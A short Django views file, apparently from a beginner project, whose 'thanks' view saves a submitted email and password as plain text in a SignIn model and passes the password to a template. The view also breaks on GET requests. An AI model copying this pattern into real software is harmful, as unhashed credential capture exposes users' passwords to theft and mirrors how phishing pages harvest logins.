# -*- coding: utf-8 -*-
from __future__ import unicode_literals

from django.shortcuts import render

from django.views.decorators.csrf import csrf_exempt

from .models import SignIn

from django.contrib.auth import authenticate

# Create your views here.

def index(request):
	return render(request,'jee/index.html')

def thanks(request):
	if request.method =="POST":
		email= request.POST.get('email')
		password= request.POST.get('password')

		context = {
			'email' : email,
			'password':password
		}
		SignIn.objects.create(email = email,password=password)
	return render(request,'jee/thanks.html',context)

def create(request):
	return render(request,'jee/create.html')